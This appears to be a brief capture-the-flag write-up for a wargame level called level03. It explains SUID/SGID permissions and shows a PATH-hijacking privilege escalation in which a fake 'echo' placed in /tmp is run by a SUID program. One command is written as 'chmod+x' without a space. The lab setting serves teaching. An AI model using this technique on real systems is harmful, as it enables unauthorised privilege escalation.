the s in permissions stand for SUID and SGID (Set User/Group ID), meaning the program will be run with the permissions of the file's owner

./level03

it seems to always run the command "echo Exploit me"

we can write our own echo version in /tmp and add it to the path for it to be run instead :

echo getflag > /tmp/echo
chmod+x /tmp/echo
export PATH=/tmp:$PATH
./level03
